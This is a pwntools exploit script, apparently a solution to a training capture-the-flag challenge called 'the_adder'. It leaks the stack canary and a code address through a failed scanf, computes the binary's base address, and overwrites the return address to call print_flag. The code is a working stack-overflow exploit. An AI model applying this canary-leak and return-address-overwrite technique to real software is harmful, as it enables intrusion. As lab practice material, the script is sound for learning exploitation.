from pwn import *
import time

CHALL_PATH = "./the_adder"
CHALL = ELF(CHALL_PATH)
COMMANDS = """
# brva 0x01575
c
"""

context.arch = "amd64"

if args.GDB:
    c = gdb.debug(CHALL_PATH, COMMANDS)
elif args.REMOTE:
    c = remote("the-adder.training.offensivedefensive.it", 8080, ssl=True)
else:
    c = process(CHALL_PATH)

def add_number(num):
    c.recvuntil(b"> ")
    c.sendline(b"1")
    c.recvuntil(b"Number: ")
    c.sendline(num)
    c.recvuntil(b"[y/n]\n")
    c.sendline(b"y")

def quit():
    c.recvuntil(b"> ")
    c.sendline(b"3")

def leak_canary():
    for i in range(9):
        add_number(b"1")  # fil the buffer
    add_number(b"-9")  # result must be 0

    c.recvuntil(b"> ")
    c.sendline(b"1")
    c.recvuntil(b"Number: ")
    c.sendline(b"a")  # the scanf will fail and the canary will be extracted from the stack
    
    canary = c.recvuntil(b"? [y/n]\n").split()[-2][:-1] # extract the canary from output
    canary = int(canary)
    return canary

def leak_main():
    c.recvuntil(b"> ")
    c.sendline(b"1")
    c.recvuntil(b"Number: ")
    c.sendline(b"a")  # the scanf will fail and the main_addr will be extracted from the stack
    
    main_leak = c.recvuntil(b"? [y/n]\n").split()[-2][:-1] # extract the main_addr from output
    main_leak = int(main_leak)
    return main_leak

# -------------------
# EXPLOIT STARTS HERE
# -------------------

canary = leak_canary()
print(f"[!!!] Canary: {hex(canary)}")

add_number(b"%d" % canary)  # reinsert the canary
neg_canary = -1 * canary    
add_number(b"%d" % neg_canary)  # insert another number to reach the main_leak, result = 0

main_leak = leak_main() # is not the main but main+39, see GDB
print(f"[!!!] Main+39 leak: {hex(main_leak)}")

# Calculate base elf address
CHALL.address = main_leak - 39 - CHALL.symbols["main"] # 39 is the offset from the leak to the main function
print("[!!!] ELF Base:", hex(CHALL.address))
print("[!!!] print_flag @:", hex(CHALL.symbols["print_flag"]))

add_number(b"%d" % CHALL.symbols["print_flag"])   # overwrite the return address with print_flag

quit()
c.interactive()
